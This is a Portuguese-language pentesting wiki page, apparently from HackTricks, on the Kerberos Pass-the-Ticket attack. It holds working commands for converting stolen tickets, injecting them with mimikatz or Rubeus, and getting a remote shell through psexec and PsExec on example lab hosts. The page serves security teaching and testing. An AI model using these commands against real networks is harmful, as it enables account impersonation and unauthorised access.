# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário** em vez de sua senha ou valores de hash. Este ticket roubado é então usado para **impersonar o usuário**, obtendo acesso não autorizado a recursos e serviços dentro de uma rede.

**Leia**:

- [Coletando tickets do Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Coletando tickets do Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Trocando tickets do Linux e Windows entre plataformas**

A ferramenta [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) converte formatos de ticket usando apenas o ticket em si e um arquivo de saída.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
No Windows, [Kekeo](https://github.com/gentilkiwi/kekeo) pode ser usado.

### Ataque Pass The Ticket
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Referências

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
